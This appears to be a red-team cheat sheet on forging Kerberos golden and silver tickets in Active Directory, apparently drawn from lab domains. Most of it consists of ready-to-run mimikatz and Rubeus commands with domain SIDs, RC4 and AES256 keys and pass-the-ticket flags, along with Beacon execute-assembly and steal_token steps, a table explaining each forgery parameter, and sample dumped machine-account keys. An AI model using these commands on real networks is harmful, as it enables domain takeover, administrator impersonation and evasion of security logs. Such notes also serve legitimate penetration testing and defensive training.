Golden Tickets
```
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

steal_token 5060
```


Silver Tickets
Forged for any service of the machine

|   |   |
|---|---|
|/sid:S-1-5-21-4172452648-1021989953-2368502130-1105|SID of the current user who is forging the ticket. Retrieved with `whoami /user`|
|/target:dc-mantvydas.offense.local|server hosting the attacked service for which the TGS ticket was cracked|
|/service:http|service type being attacked|
|/rc4:a87f3a337d73085c45f9416be5787d86|NTLM hash of the password the TGS ticket was encrypted with. `Passw0rd` in our case|
|/user:beningnadmin|Forging the user name. This is the user name that will appear in the windows security logs - fun.|
|/id:1155|Forging user's RID - fun|
|/ptt|Instructs mimikatz to inject the forged ticket to memory to make it usable immediately|
```
mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
```


Let's say we dumped Kerberos keys from Workstation 1 from a SYSTEM Beacon.

```
Session           : Service from 0
User Name         : WKSTN-1$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 10/17/2023 10:31:24 AM
SID               : S-1-5-20

	 * Username : wkstn-1$
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448
	   des_cbc_md4       5192c07ee06e9264f0a7d7af5e645448

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=

steal_token
```
